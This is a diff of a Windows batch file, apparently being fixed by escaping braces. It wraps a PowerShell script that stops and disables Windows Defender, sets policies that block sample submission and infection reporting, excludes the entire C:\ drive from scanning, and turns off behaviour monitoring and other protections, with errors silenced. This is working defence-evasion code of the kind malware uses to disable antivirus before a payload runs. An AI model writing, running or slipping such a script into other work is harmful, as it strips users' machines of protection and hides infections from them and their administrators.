@@ -8,22 +8,22 @@
 @echo off
 
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
- "try {^
+ "try ^{^
     Get-Service WinDefend | Stop-Service -Force^
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -value 4 -Type DWORD -Force^
 }^
-catch {^
+catch ^{^
     Write-Warning "Failed to disable WinDefend service"^
 }^
 
-try {^
+try ^{^
     New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ea 0 | Out-Null^
     New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null^
     New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null^
     New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null^
     New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null^
     New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null^
-    if (-Not ((Get-WmiObject -class Win32_OperatingSystem).Version -eq "6.1.7601")) {^
+    if (-Not ((Get-WmiObject -class Win32_OperatingSystem).Version -eq "6.1.7601")) ^{^
         Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null^
         Set-MpPreference -DisableArchiveScanning $true  -ea 0 | Out-Null^
         Set-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0 | Out-Null^
@@ -45,10 +45,10 @@ try {^
         Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null^
 
     }^
-} ^
-catch {^
+^}^
+catch ^{^
   Write-Warning "Failed to Disabled Defender"^
-}"
+}^"
 
 
 
